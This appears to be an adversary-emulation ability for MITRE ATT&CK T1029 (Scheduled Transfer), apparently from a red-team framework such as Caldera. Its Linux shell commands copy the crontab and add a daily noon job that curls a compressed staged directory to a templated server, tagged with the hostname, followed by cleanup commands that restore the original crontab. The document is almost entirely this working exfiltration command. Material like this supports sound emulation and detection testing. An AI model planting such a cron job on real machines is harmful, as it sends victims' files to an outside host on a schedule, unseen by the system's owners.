## Scheduled Exfiltration
MITRE ATT&CK: T1029 (Scheduled Transfer)
Tactic: exfiltration

This ability exfiltrates the staged directory at a scheduled time.

### Commands (linux/sh)
```bash
crontab -l > /tmp/origcron;
crontab -l > /tmp/mycron;
echo "0 12 * * * curl -F "data=@#{host.dir.compress}" --header "X-Request-ID: `hostname`-#{paw}" #{server}/file/upload" >> /tmp/mycron;
crontab /tmp/mycron;
```

### Cleanup
```bash
rm /tmp/mycron;
crontab /tmp/origcron;
rm /tmp/origcron;
